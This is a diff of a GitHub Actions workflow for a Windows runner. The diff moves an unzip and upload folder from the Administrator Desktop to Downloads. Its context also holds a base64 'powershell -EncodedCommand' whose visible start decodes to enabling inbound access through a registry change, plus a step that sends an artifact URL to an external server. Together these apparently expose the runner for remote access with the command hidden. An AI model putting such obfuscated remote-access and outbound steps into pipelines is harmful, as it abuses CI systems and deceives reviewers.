@@ -27,13 +27,15 @@ jobs:
           echo "Downloading artifact from $url to $output using curl"
           curl -L "$url" -o "$output"
 
-      - name: Unzip downloaded artifact to Administrator Desktop (if downloaded)
+      - name: Unzip downloaded artifact to Administrator Downloads (if downloaded)
         if: steps.get_url.outputs.url != ''
         shell: pwsh
         run: |
           $output = "${{ github.workspace }}\data.zip"
-          $targetDir = "C:\Users\Administrator\Desktop\data"
+          $targetDir = "C:\Users\Administrator\Downloads\data"
+          Write-Host "Checking for $output"
           if (Test-Path $output) {
+            Write-Host "Found artifact zip at $output"
             Expand-Archive -Path $output -DestinationPath $targetDir -Force
             Remove-Item $output
           } else {
@@ -45,16 +47,16 @@ jobs:
           powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB[...]
         timeout-minutes: 3
 
-      - name: List Desktop Data contents (for debugging)
-        run: dir C:\Users\Administrator\Desktop\data
+      - name: List Downloads Data contents (for debugging)
+        run: dir C:\Users\Administrator\Downloads\data
         continue-on-error: true
 
-      - name: Upload Desktop Data as "data" artifact
+      - name: Upload Downloads Data as "data" artifact
         id: upload_data
         uses: actions/upload-artifact@v4
         with:
           name: data
-          path: C:\Users\Administrator\Desktop\data
+          path: C:\Users\Administrator\Downloads\data
         if: always()
 
       - name: Send artifact download URL to external server (curl)
